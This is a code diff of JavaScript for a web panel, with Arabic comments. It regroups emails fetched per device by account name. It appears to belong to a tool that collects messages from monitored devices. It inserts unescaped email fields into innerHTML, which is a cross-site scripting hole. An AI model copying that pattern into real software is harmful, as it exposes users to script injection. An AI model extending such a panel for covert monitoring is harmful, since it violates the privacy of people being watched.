@@ -212,7 +212,7 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ تحميل رسائل البريد — كل بريد في مربع منفصل حسب المرسل
+// ✅ تحميل رسائل البريد — كل حساب في مربع منفصل
 async function loadEmails() {
     try {
         const response = await fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
@@ -228,32 +228,32 @@ async function loadEmails() {
             return;
         }
         
-        // ✅ كل بريد في مربع منفصل — حسب المرسل
+        // ✅ تجميع حسب اسم الحساب
         const groups = {};
         emails.forEach(email => {
-            const sender = email.sender || 'غير معروف';
-            if (!groups[sender]) groups[sender] = [];
-            groups[sender].push(email);
+            const account = email.account_name || email.sender || 'غير معروف';
+            if (!groups[account]) groups[account] = [];
+            groups[account].push(email);
         });
         
-        Object.keys(groups).forEach(sender => {
-            const senderEmails = groups[sender];
-            const lastEmail = senderEmails[0];
+        Object.keys(groups).forEach(account => {
+            const accountEmails = groups[account];
+            const lastEmail = accountEmails[0];
             const appName = lastEmail.app_name || 'Email';
             
             const groupDiv = document.createElement('div');
             groupDiv.className = 'conversation-item';
             groupDiv.style.cursor = 'pointer';
-            groupDiv.onclick = () => openEmailGroup(sender, groupDiv);
+            groupDiv.onclick = () => openEmailGroup(account, groupDiv);
             
             groupDiv.innerHTML = `
                 <div class="conversation-avatar">📧</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">${sender}</div>
+                    <div class="conversation-name">${account}</div>
                     <div class="conversation-preview">${appName} — ${lastEmail.subject || ''}</div>
-                    <div class="conversation-time">📅 ${formatDate(lastEmail.timestamp)} | عدد الرسائل: ${senderEmails.length}</div>
+                    <div class="conversation-time">📅 ${formatDate(lastEmail.timestamp)} | عدد الرسائل: ${accountEmails.length}</div>
                 </div>
-                <div class="conversation-count">${senderEmails.length}</div>
+                <div class="conversation-count">${accountEmails.length}</div>
             `;
             
             div.appendChild(groupDiv);
@@ -265,8 +265,8 @@ async function loadEmails() {
     } catch (e) {}
 }
 
-// ✅ فتح مجموعة بريد — تظهر كل رسائل المرسل
-function openEmailGroup(sender, groupDiv) {
+// ✅ فتح مجموعة حساب — تظهر كل رسائله
+function openEmailGroup(account, groupDiv) {
     const existingBox = groupDiv.nextElementSibling;
     if (existingBox && existingBox.classList.contains('email-box')) {
         existingBox.remove();
@@ -280,14 +280,14 @@ function openEmailGroup(sender, groupDiv) {
     fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`)
         .then(res => res.json())
         .then(emails => {
-            const senderEmails = emails.filter(e => (e.sender || 'غير معروف') === sender)
+            const accountEmails = emails.filter(e => (e.account_name || e.sender || 'غير معروف') === account)
                 .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
             
-            senderEmails.forEach(email => {
+            accountEmails.forEach(email => {
                 const item = document.createElement('div');
                 item.style.cssText = 'padding:12px;border-bottom:1px solid #222;';
                 item.innerHTML = `
-                    <div style="color:#00ffcc;font-size:14px;font-weight:bold;">📧 ${email.app_name || 'Email'}</div>
+                    <div style="color:#00ffcc;font-size:14px;font-weight:bold;">📧 ${email.app_name || 'Email'} — ${email.sender || ''}</div>
                     <div style="color:#ccc;font-size:13px;margin-top:3px;">${email.subject || ''}</div>
                     <div style="color:#888;font-size:11px;margin-top:3px;">📅 ${formatDate(email.timestamp)}</div>
                 `;
